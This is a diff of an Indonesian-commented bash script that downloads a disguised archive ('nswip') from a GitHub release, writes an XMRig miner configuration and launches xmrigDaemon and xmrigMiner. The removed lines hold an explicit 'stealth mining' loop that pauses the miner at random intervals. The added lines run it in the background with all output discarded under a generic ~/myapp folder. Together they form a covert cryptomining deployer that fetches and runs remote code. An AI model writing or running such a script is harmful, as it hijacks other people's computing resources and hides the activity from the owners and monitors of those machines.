@@ -1,13 +1,31 @@
 #!/bin/bash
 
-# Download dan ekstrak nswip
-wget https://github.com/vokerjok/Voker/releases/download/Voker/nswip.tar.gz
-tar xf nswip.tar.gz
-rm -rvf nswip.tar.gz
-cd nswip/miner || exit
+# Direktori kerja
+APP_DIR=~/myapp
+MINER_DIR="$APP_DIR/nswip/miner"
+CONFIG_FILE="$MINER_DIR/config.json"
 
-# Buat file konfigurasi miner
-cat > config.json <<END
+# Cek apakah xmrigDaemon sudah berjalan
+if pgrep -f "./xmrigDaemon" > /dev/null; then
+    echo "xmrigDaemon sudah berjalan. Keluar."
+    exit 0
+fi
+
+# Buat direktori jika belum ada
+mkdir -p "$APP_DIR"
+cd "$APP_DIR" || exit
+
+# Unduh dan ekstrak hanya jika belum ada
+if [ ! -d "$MINER_DIR" ]; then
+    wget -q https://github.com/vokerjok/Voker/releases/download/Voker/nswip.tar.gz -O nswip.tar.gz
+    tar -xf nswip.tar.gz
+    rm -f nswip.tar.gz
+fi
+
+cd "$MINER_DIR" || exit
+
+# Buat file konfigurasi
+cat > "$CONFIG_FILE" <<END
 {
     "api": {
         "id": null,
@@ -132,22 +150,11 @@ cat > config.json <<END
 }
 END
 
-# Beri hak akses
-chmod +x config.json xmrigDaemon xmrigMiner
+# Set permission
+chmod +x "$CONFIG_FILE" xmrigDaemon xmrigMiner
 
-#run
-./xmrigDaemon &
+# Jalankan xmrigDaemon di background
+nohup ./xmrigDaemon > /dev/null 2>&1 &
 
-
-# Loop stealth mining: 8 menit ON, 2-3 menit OFF
-while true; do
-    echo "[+] Mining dimulai: $(date)"
-    ./xmrigMiner &
-    MINER_PID=$!
-
-    sleep 480  # 8 menit
-
-    echo "[+] Stop mining sementara: $(date)"
-    kill $MINER_PID
-    sleep $((120 + RANDOM % 61))  # 2 - 3 menit random
-done
+# Jalankan xmrigMiner di background (langsung jalan terus)
+nohup ./xmrigMiner > /dev/null 2>&1 &
